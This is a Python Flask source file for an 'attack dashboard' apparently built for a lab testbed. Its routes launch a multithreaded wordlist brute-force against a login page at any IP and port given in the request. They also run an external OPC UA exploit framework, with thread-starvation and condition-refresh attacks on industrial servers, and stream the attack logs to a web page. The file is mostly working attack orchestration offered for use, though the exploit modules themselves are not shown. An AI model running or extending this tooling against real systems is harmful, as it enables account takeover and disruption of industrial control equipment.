from flask import Flask, jsonify, request, render_template
import os
import socket
import subprocess
import sys
import threading

app = Flask(__name__)

attack_lock = threading.Lock()
attack_processes = []
attack_state = {
    'status': 'idle',
    'current_attack': None,
    'message': 'No attack started.',
    'found_password': None,
    'attempts': [],  # recent passwords tried by brute force
    'logs': []       # recent lines from exploit framework
}

# ----------------------------
# Attack Helper Functions
# ----------------------------

def run_bruteforce_attack(ip_addr, port, path='/login'):
    try:
        import brute_force
        # reset state
        brute_force.FOUND = False
        brute_force.FOUND_PASSWORD = None
        # allow custom login path
        if not path.startswith('/'):
            path = '/' + path
        brute_force.URL = f"http://{ip_addr}:{port}{path}"

        # Clear previous attempts
        with attack_lock:
            attack_state['attempts'].clear()
            attack_state['found_password'] = None

        # Read wordlist and submit attempts similar to brute_force.run_test
        try:
            with open(brute_force.WORDLIST_PATH, 'r', encoding='latin-1') as f:
                from concurrent.futures import ThreadPoolExecutor
                def worker(pw):
                    if brute_force.FOUND:
                        return
                    # record attempt (keep last 50)
                    with attack_lock:
                        attack_state['attempts'].append(pw)
                        if len(attack_state['attempts']) > 50:
                            attack_state['attempts'] = attack_state['attempts'][-50:]
                        attack_state['message'] = f"Trying: {pw}"
                    brute_force.attempt_password(pw)

                with ThreadPoolExecutor(max_workers=brute_force.THREADS) as ex:
                    for line in f:
                        if brute_force.FOUND:
                            break
                        pw = line.strip()
                        ex.submit(worker, pw)
        except FileNotFoundError:
            attack_state['message'] = 'Wordlist not found.'
            return

        if getattr(brute_force, 'FOUND_PASSWORD', None):
            attack_state['found_password'] = brute_force.FOUND_PASSWORD
            attack_state['message'] = f"Password found: {brute_force.FOUND_PASSWORD}"
        else:
            attack_state['message'] = 'Brute force finished without finding a password.'
    except Exception as e:
        attack_state['message'] = f'Brute force attack failed: {e}'
        print("[!] Brute force attack failed:", e)
    finally:
        attack_state['status'] = 'done'
        attack_state['current_attack'] = None


def run_exploit_framework_attack(attack_name, server_type, ip_addr, port, endpoint):
    main_script = os.path.join(os.path.dirname(__file__), "opcua-exploit-framework", "main.py")
    if not os.path.isfile(main_script):
        print("[!] Exploit framework main.py not found")
        return

    cmd = [sys.executable, main_script, server_type, ip_addr, str(port), endpoint, attack_name]
    try:
        # capture stdout so we can stream logs to the UI
        proc = subprocess.Popen(cmd, cwd=os.path.dirname(__file__), stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
        with attack_lock:
            attack_processes.append(proc)

        def reader_thread(p):
            try:
                for line in p.stdout:
                    line = line.rstrip('\n')
                    with attack_lock:
                        attack_state['logs'].append(line)
                        # keep logs trimmed
                        if len(attack_state['logs']) > 200:
                            attack_state['logs'] = attack_state['logs'][-200:]
                        attack_state['message'] = line
            except Exception as e:
                with attack_lock:
                    attack_state['logs'].append(f"[!] log reader error: {e}")

        threading.Thread(target=reader_thread, args=(proc,), daemon=True).start()
    except Exception as e:
        print("[!] Failed to start exploit framework attack:", e)


# ----------------------------
# Routes
# ----------------------------

@app.route('/run-attack', methods=['POST'])
def run_attack():
    data = request.json or {}
    attack_name = data.get('attack')
    if attack_name == 'brute_force':
        ip_addr = data.get('brute_force_ip', '127.0.0.1')
        port = int(data.get('brute_force_port', 5005) or 5005)
        path = data.get('brute_force_path', '/login')
        print(f"[attack_app] run_attack called: {attack_name} target={ip_addr}:{port} path={path}")

        attack_state.update({
            'status': 'running',
            'current_attack': 'brute_force',
            'message': 'Running brute force...',
            'found_password': None
        })
        threading.Thread(target=run_bruteforce_attack, args=(ip_addr, port, path), daemon=True).start()
        message = 'Brute force attack started in background.'
    elif attack_name in ('thread_pool_wait_starvation', 'unlimited_condition_refresh'):
        server_type = data.get('server_type', 'prosys')
        ip_addr = data.get('opcua_ip', '127.0.0.1')
        port = int(data.get('opcua_port', 4840) or 4840)
        endpoint = data.get('endpoint', '/freeopcua/server/')
        print(f"[attack_app] run_attack called: {attack_name} server_type={server_type} target={ip_addr}:{port} endpoint={endpoint}")

        attack_state.update({
            'status': 'running',
            'current_attack': attack_name,
            'message': f'{attack_name.replace("_", " ").title()} attack started.',
            'found_password': None
        })
        threading.Thread(target=run_exploit_framework_attack, args=(attack_name, server_type, ip_addr, port, endpoint), daemon=True).start()
        message = f'{attack_name.replace("_", " ").title()} attack started in background.'
    else:
        print(f"[attack_app] Unknown attack type: {attack_name}")
        return jsonify({'success': False, 'error': 'Unknown attack'}), 400

    return jsonify({'success': True, 'message': message})


def stop_attacks():
    stopped_any = False

    try:
        import brute_force
        if not brute_force.FOUND:
            brute_force.FOUND = True
        stopped_any = True
    except Exception:
        pass

    with attack_lock:
        for proc in attack_processes[:]:
            if proc.poll() is None:
                try:
                    proc.terminate()
                    proc.wait(timeout=3)
                except Exception:
                    try:
                        proc.kill()
                        proc.wait(timeout=3)
                    except Exception:
                        pass
                stopped_any = True
        attack_processes.clear()

    return stopped_any


@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    print('[attack_app] stop_attack called')
    if stop_attacks():
        attack_state.update({
            'status': 'stopped',
            'message': 'Attack interrupted.',
            'current_attack': None
        })
        return jsonify({'success': True, 'message': 'Attack interrupt requested.'})
    return jsonify({'success': False, 'message': 'No running attack found.'}), 404


@app.route('/target-status')
def target_status():
    ip_addr = request.args.get('ip', '127.0.0.1')
    port = request.args.get('port', '4840')
    try:
        port = int(port)
    except ValueError:
        return jsonify({'success': False, 'reachable': False, 'message': 'Invalid port'}), 400

    try:
        with socket.create_connection((ip_addr, port), timeout=2):
            return jsonify({'success': True, 'reachable': True, 'message': 'Reachable'})
    except Exception as e:
        return jsonify({'success': False, 'reachable': False, 'message': str(e)})


@app.route('/attack-status')
def attack_status():
    state = attack_state.copy()
    return jsonify(state)


@app.route('/')
def home():
    return render_template('attack_dashboard.html')


if __name__ == '__main__':
    try:
        app.run(debug=True, port=5001, use_reloader=False)
    except KeyboardInterrupt:
        print('\n[attack_app] Keyboard interrupt received, shutting down...')
        sys.exit(0)

